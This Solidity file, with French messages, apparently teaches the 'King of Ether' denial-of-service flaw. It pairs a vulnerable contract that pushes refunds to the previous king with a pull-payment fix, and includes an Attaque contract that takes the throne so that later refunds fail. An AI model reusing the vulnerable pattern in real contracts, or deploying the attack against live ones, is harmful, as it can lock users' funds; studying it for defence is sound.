// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract KingOfEther {
    address public roi;
    uint public balance;

    function claimTrone() external payable {
        require(
            msg.value > balance,
            "Vous avez besoin de payer plus que la personne precedente"
        );

        (bool success, ) = roi.call{value: balance}("");
        require(success, "La transaction a echoue");

        balance = msg.value;
        roi = msg.sender;
    }
}

contract KingOfEther1 {
    address public roi;
    uint public balance;
    mapping(address => uint) public balances;

    function claimTrone() external payable {
        require(
            msg.value > balance,
            "Vous avez besoin de payer plus que la personne precedente"
        );

        balances[roi] += balance;

        balance = msg.value;
        roi = msg.sender;
    }

    function retirer() public {
        require(
            msg.sender != roi,
            "Le roi actuel ne peut pas retirer les fonds."
        );

        uint montant = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool success, ) = msg.sender.call{value: montant}("");
        require(success, "La transaction a echoue");
    }
}

contract Attaque {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = _kingOfEther;
    }

    function attaque() public payable {
        kingOfEther.claimTrone{value: msg.value}();
    }
}
